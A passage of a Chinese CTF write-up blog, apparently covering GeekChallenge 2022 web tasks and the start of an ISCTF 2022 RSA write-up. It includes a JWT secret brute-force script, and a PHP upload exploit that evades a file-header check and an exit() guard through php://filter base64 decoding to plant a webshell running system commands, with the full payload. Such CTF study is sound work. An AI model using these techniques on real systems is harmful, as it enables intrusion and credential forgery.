class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> termcolor</span><br><span class="line"></span><br><span class="line">jwt_str = <span class="string">R&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNzd29yZCI6IjY2NiIsImlkIjoxLCJ1c2VyTmFtZSI6IlN5Y2xvdmVyIiwiZXhwIjoxNjY4NzY1MTU0LCJpYXQiOjE2Njg3NjMzNTR9._GoRgp06XkKKLs_T2EpphREcS8zVL-DzQI85ikps6K4&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;top1000.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f :</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        key_ = line.strip()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            jwt.decode(jwt_str, verify=<span class="literal">True</span>,key=key_,algorithms=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\bbingo! key--&gt;&#x27;</span>,termcolor.colored(key_, <span class="string">&#x27;green&#x27;</span>),<span class="string">&#x27;&lt;--&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>(jwt.exceptions.ExpiredSignatureError,jwt.exceptions.InvalidAudienceError,jwt.exceptions.InvalidIssuedAtError,jwt.exceptions.InvalidIssuedAtError,jwt.exceptions.ImmatureSignatureError):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\bbingo! key--&gt;&#x27;</span>,termcolor.colored(key_, <span class="string">&#x27;green&#x27;</span>),<span class="string">&#x27;&lt;--&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27; &#x27;</span> * <span class="number">64</span>, <span class="string">&#x27;\r\btry&#x27;</span>,key_,end=<span class="string">&#x27;&#x27;</span>,flush=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\bnot found.&#x27;</span>)</span><br></pre></td></tr></table></figure><p>爆破得到密钥：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bingo! key--&gt; loveSyc &lt;--  </span><br></pre></td></tr></table></figure><p>重新制作token：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221118174752379.png" alt="image-20221118174752379"></p><p>得到新的token，换上，再访问<code>/secure/admin</code>：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">HTTP/1.1</span> <span class="number">200</span> </span><br><span class="line"><span class="attr">Content-Type:</span> <span class="string">text/html;charset=UTF-8</span></span><br><span class="line"><span class="attr">Date:</span> <span class="string">Fri,</span> <span class="number">18</span> <span class="string">Nov</span> <span class="number">2022 09:48:29 </span><span class="string">GMT</span></span><br><span class="line"><span class="attr">Content-Length:</span> <span class="number">84</span></span><br><span class="line"></span><br><span class="line"><span class="string">5LiL5LiA5YWz55u05o6l5Y67L1htbOeci+eci+acieayoeacieS9oOaDs+imgeeahOS4nOilv+WQpyEhIQ==</span></span><br></pre></td></tr></table></figure><p>base64解密得：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">下一关直接去/Xml看看有没有你想要的东西吧!!!</span><br></pre></td></tr></table></figure><p>带着token去访问<code>/Xml</code>，得到:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Syclover<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lastname</span>&gt;</span>Good!!!<span class="tag">&lt;/<span class="name">lastname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>没思路了，菜</p></blockquote><details class="toggle" ><summary class="toggle-button" style="">查看flag</summary><div class="toggle-content"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></div></details><h3 id="0x0e-题目：edit-php"><a href="#0x0e-题目：edit-php" class="headerlink" title="0x0e 题目：edit_php"></a>0x0e 题目：edit_php</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GeekChallengeUser ~ % ./edit_php</span><br><span class="line"></span><br><span class="line">=== challenge info ===</span><br><span class="line">type: web</span><br><span class="line">points: 250</span><br><span class="line">description: http://49.235.109.5:8302/</span><br><span class="line">hint: 题目每隔二十分钟刷新；需要简单提权</span><br><span class="line">=== challenge info ===</span><br></pre></td></tr></table></figure><h4 id="解题思路-13"><a href="#解题思路-13" class="headerlink" title="解题思路"></a>解题思路</h4><blockquote><p>没做出，菜</p></blockquote><details class="toggle" ><summary class="toggle-button" style="">查看flag</summary><div class="toggle-content"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></div></details><h3 id="0x0f-题目：ezrequset"><a href="#0x0f-题目：ezrequset" class="headerlink" title="0x0f 题目：ezrequset"></a>0x0f 题目：ezrequset</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GeekChallengeUser ~ % ./ezrequset</span><br><span class="line"></span><br><span class="line">=== challenge info ===</span><br><span class="line">type: web</span><br><span class="line">points: 250</span><br><span class="line">description: 依梦学姐想上水课，你能帮帮她吗</span><br><span class="line">hint:</span><br><span class="line">=== challenge info ===</span><br></pre></td></tr></table></figure><h4 id="解题思路-14"><a href="#解题思路-14" class="headerlink" title="解题思路"></a>解题思路</h4><p>通过正则匹配需求，然后编写python脚本进行抢课，成功后查看cookie即得flag，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=19f3724c95dffb937b3ac23a13a223ad; path=/&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">url_index = <span class="string">&quot;http://p4fa04c6-697d-11ed-bc58-165319f5738e.challenge.sycsec.com/?action=index&quot;</span></span><br><span class="line">res = requests.post(url_index,data=&#123;<span class="string">&#x27;xh&#x27;</span>:<span class="number">1234</span>&#125;,headers=header)</span><br><span class="line">txt = res.text</span><br><span class="line"><span class="comment"># print(txt)</span></span><br><span class="line">xlass = re.findall(<span class="string">r&quot;鱼:(.+?)&lt;!DOCTYPE&quot;</span>,txt)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(xlass)</span><br><span class="line">no = re.findall(<span class="string">r&quot;(.+?)号&quot;</span>,xlass)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(no)</span><br><span class="line">xlass1 = re.findall(<span class="string">r&quot;号(.*)&quot;</span>,xlass)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(xlass1)</span><br><span class="line">url_check = <span class="string">&quot;http://p4fa04c6-697d-11ed-bc58-165319f5738e.challenge.sycsec.com/?action=check&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;num&quot;</span>:no,</span><br><span class="line">    <span class="string">&quot;class&quot;</span>:xlass1,</span><br><span class="line">&#125;</span><br><span class="line">res1 = requests.post(url_check,data,headers=header)</span><br><span class="line"><span class="built_in">print</span>(res1.text)</span><br><span class="line">cookie = requests.utils.dict_from_cookiejar(res1.cookies)</span><br><span class="line"><span class="built_in">print</span>(cookie)</span><br></pre></td></tr></table></figure><blockquote><p>需要提前抓包获得一份Cookie放到header中</p></blockquote><p>运行结果：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221121174705697.png" alt="image-20221121174705697"></p><details class="toggle" ><summary class="toggle-button" style="">查看flag</summary><div class="toggle-content"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;just_@_ez_requ3st&#125;</span><br></pre></td></tr></table></figure></div></details><h3 id="0x10-题目：Not-Stay"><a href="#0x10-题目：Not-Stay" class="headerlink" title="0x10 题目：Not_Stay"></a>0x10 题目：Not_Stay</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GeekChallengeUser ~ % ./Not_Stay</span><br><span class="line"></span><br><span class="line">=== challenge info ===</span><br><span class="line">type: web</span><br><span class="line">points: 250</span><br><span class="line">description: http://1.14.92.115:9091/</span><br><span class="line">hint: stay,don&#x27;t exitt</span><br><span class="line">=== challenge info ===</span><br></pre></td></tr></table></figure><h4 id="解题思路-15"><a href="#解题思路-15" class="headerlink" title="解题思路"></a>解题思路</h4><p>进入网址，得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//简单的实现文件头检测</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;waf.php&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">uuid</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="variable">$chars</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">mt_rand</span>(), <span class="literal">true</span>));  </span><br><span class="line">    <span class="variable">$uuid</span> = <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">0</span>, <span class="number">8</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">8</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span> </span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">12</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">16</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">20</span>, <span class="number">12</span> );  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$uuid</span> ;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$safe_header</span> = <span class="string">&#x27;&lt;?php exit();?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;path&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;path&#x27;</span>,<span class="title function_ invoke__">uuid</span>());</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$path</span> = <span class="string">&#x27;./upload/&#x27;</span>.<span class="variable">$_COOKIE</span>[<span class="string">&#x27;path&#x27;</span>].<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$path</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$path</span>);</span><br><span class="line">    <span class="title function_ invoke__">chmod</span>(<span class="variable">$path</span>,<span class="number">0755</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file_data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/tmp/&#x27;</span>.<span class="variable">$_COOKIE</span>[<span class="string">&#x27;path&#x27;</span>],<span class="variable">$file_data</span>);</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="string">&#x27;/tmp/&#x27;</span>.<span class="variable">$_COOKIE</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> != <span class="string">&quot;GIF&quot;</span> &amp;&amp; <span class="variable">$file_type</span> != <span class="string">&quot;PNG&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;I need data&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="variable">$safe_header</span>.<span class="variable">$file_data</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;I need name&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这是一道PHP文件上传的题，主要漏洞函数为<code>file_put_contents()</code>，这里利用的是最后一个<code>file_put_contents()</code></p><p>因为第一个file_put_contents传的是根目录下的&#x2F;tmp文件夹，没有权限读写。</p><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$path</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$path</span>);</span><br><span class="line">    <span class="title function_ invoke__">chmod</span>(<span class="variable">$path</span>,<span class="number">0755</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里好心的帮我们赋予了读取的权限，即只需要在最后的file_put_contents进行写入我们的<code>木🐎</code>文件</p><p>ps：<strong>由于我懒得用蚁剑上马，这里我直接用system命令判断flag位置并读取了</strong></p></blockquote><p>第一步是文件头判断的过滤，关键代码位于：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="string">&#x27;/tmp/&#x27;</span>.<span class="variable">$_COOKIE</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> != <span class="string">&quot;GIF&quot;</span> &amp;&amp; <span class="variable">$file_type</span> != <span class="string">&quot;PNG&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这个其实是最简单的，只需要上传的<code>$file_data</code>开头包含<code>GIF89a</code>即可。</p><p>例如我们需要上传的数据为 abcd 只需要改为 <em>GIF89a</em>abcd</p><p>第二步是绕过<code>&lt;?php exit();?&gt;</code>，关键代码位于：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$safe_header</span> = <span class="string">&#x27;&lt;?php exit();?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="variable">$safe_header</span>.<span class="variable">$file_data</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;I need name&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个<code>&lt;?php exit();?&gt;</code>被加在了文件的最开头，导致后面无论是什么都不会执行。</p><p>绕过方法是通过<strong>php:&#x2F;&#x2F;filter</strong>的<strong>base64-decode</strong>将<code>&lt;?php exit();?&gt;</code>变成<code>phpexit</code></p><p>具体原理是base64编码中不包含<code>&lt;?();?&gt;</code>等字符，解码时会将其直接抛弃。</p><blockquote><p>这里还需要注意，base64是8位一组进行解码，phpexit是7字节，所以还需要补上1字节（这里加个<code>a</code>）</p><p>即<code>payload</code>–&gt;<code>apayload</code></p><p>由于开头还得是<code>GIF89a</code>，长度为6字节，所以还需补上2字节</p><p>所以最终payload应为(补了3个<code>a</code>)：</p><p><code>payload</code> –&gt; <code>GIF89aaaapayload</code></p></blockquote><p>ok思路有了，开始拿flag：</p><p>构造base64:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;GIF89a&lt;?php echo system(&quot;</span>ls /<span class="string">&quot;);?&gt;&quot;</span>);</span><br><span class="line"><span class="comment">#R0lGODlhPD9waHAgZWNobyBzeXN0ZW0oImxzIC8iKTs/Pg==</span></span><br></pre></td></tr></table></figure><blockquote><p>其实base64_encode()里面的<code>GIF89a</code>是不需要的，当时忘记删了，但是不影响最后拿flag😂</p></blockquote><p>上传到目录<code>./upload/q1jun</code>下的123.php</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221120121125145.png" alt="image-20221120121125145"></p><p>访问<code>http://1.14.92.115:9091/upload/q1jun/123.php</code>查看根目录下是否有flag：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221120120856738.png" alt="image-20221120120856738"></p><p>flag位于<code>/flagishere</code></p><p>构造base64:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;GIF89a&lt;?php echo system(&quot;</span>cat /flagishere<span class="string">&quot;);?&gt;&quot;</span>);</span><br><span class="line"><span class="comment"># R0lGODlhPD9waHAgZWNobyBzeXN0ZW0oImNhdCAvZmxhZ2lzaGVyZSIpOz8+</span></span><br></pre></td></tr></table></figure><blockquote><p>注意：记得把base64中的<code>+</code>进行url编码，否则写入到文件里的base64编码是没有<code>+</code>的。</p></blockquote><p>构造payload：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=GIF89aaaaR0lGODlhPD9waHAgZWNobyBzeXN0ZW0oImxzIC8iKTs/Pg%3d%3d&amp;filename=php://filter/write=convert.base64-decode/resource=./upload/q1jun/123.php</span><br></pre></td></tr></table></figure><p>再次访问<code>http://1.14.92.115:9091/upload/q1jun/123.php</code>得到flag：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221120121456645.png" alt="image-20221120121456645"></p><details class="toggle" ><summary class="toggle-button" style="">查看flag</summary><div class="toggle-content"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;stay_0r_get_0ut_here!&#125;</span><br></pre></td></tr></table></figure></div></details>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[ISCTF 2022]全部RSA</title>
      <link href="/2022/11/04/905cf0248ba7-q1jun/"/>
      <url>/2022/11/04/905cf0248ba7-q1jun/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-题目：babyrsa"><a href="#0x01-题目：babyrsa" class="headerlink" title="0x01 题目：babyrsa"></a>0x01 题目：babyrsa</h2><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221104093333709.png" alt="image-20221104093333709"></p><p>附件📎：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = libnum.generate_prime(<span class="number">1024</span>)</span><br><span class="line">q = gmpy2.next_prime(p)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = p * q</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;phi =&quot;</span>,phi)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>,c)</span><br><span class="line"><span class="comment"># phi = 11998145197184838105291668748328177280207361667546370722759758550200386112478801305683579153942751165452647656673385449297455560085865712968985383490367475984832103238596934094135353170257339614559178443729484992289380330326343473326373076256926770972074683466001586625109364413771716300886242679064050279982192814946404692347546718488456485946902248120569680365122714051066115263800073280766317934165938044443605816890762489369759667593014079143278938847700684310154017484382180324831332527966465023501690149664921975200082428884572496102388046780321762496321487913829155767534947229165886644311869593584303424397016</span></span><br><span class="line"><span class="comment"># c = 5664235030100231880171042228110930207351619841860785495929861788749956436657598539033166266920085041056539484368799525891006461921744810454002229224070342640529484554920046100814190479604751667796353636578589439575896923937945959721385425716210546145718343511555866077148390467362495462929359632111674082222918151696522137240478900570056689827712787018876034334301771868147820786419006234529563416734953393480238739362002713175495890402512002469332947145115452344040709333447223824491510840788018172189866931550385951940611161143400804317944263940630025758568750312753125034413169961147691163044924934280636235493483</span></span><br></pre></td></tr></table></figure><h3 id="0x0101-解题"><a href="#0x0101-解题" class="headerlink" title="0x0101 解题"></a>0x0101 解题</h3><p>分析题目可以看到<code>p</code>的生成使用了<code>next_prime()</code>，</p><blockquote><p> 说明$q$可以看成$q &#x3D; p + \varepsilon$ ，其中$\varepsilon$可以看成一个已知常数。</p></blockquote><p>题目给出了<code>phi</code>，而且<code>p</code>和<code>q</code>非常接近，可以通过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prevprime(gmpy2.iroot(phi,<span class="number">2</span>)[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>直接算出<code>p</code></p><p>所以解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime, prevprime</span><br><span class="line"></span><br><span class="line">phi = <span class="number">11998145197184838105291668748328177280207361667546370722759758550200386112478801305683579153942751165452647656673385449297455560085865712968985383490367475984832103238596934094135353170257339614559178443729484992289380330326343473326373076256926770972074683466001586625109364413771716300886242679064050279982192814946404692347546718488456485946902248120569680365122714051066115263800073280766317934165938044443605816890762489369759667593014079143278938847700684310154017484382180324831332527966465023501690149664921975200082428884572496102388046780321762496321487913829155767534947229165886644311869593584303424397016</span></span><br><span class="line">c = <span class="number">5664235030100231880171042228110930207351619841860785495929861788749956436657598539033166266920085041056539484368799525891006461921744810454002229224070342640529484554920046100814190479604751667796353636578589439575896923937945959721385425716210546145718343511555866077148390467362495462929359632111674082222918151696522137240478900570056689827712787018876034334301771868147820786419006234529563416734953393480238739362002713175495890402512002469332947145115452344040709333447223824491510840788018172189866931550385951940611161143400804317944263940630025758568750312753125034413169961147691163044924934280636235493483</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">p=prevprime(gmpy2.iroot(phi,<span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">q=nextprime(p)</span><br><span class="line">n=p*q</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">long_to_bytes(m)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;blueshark&#123;ISctf_i4_interest1ng&#125;&#x27;</span><br></pre></td></tr></table></figure><h2 id="0x02-题目：ezcry"><a href="#0x02-题目：ezcry" class="headerlink" title="0x02 题目：ezcry"></a>0x02 题目：ezcry</h2><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221104094114635.png" alt="image-20221104094114635"></p><p>附件📎：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 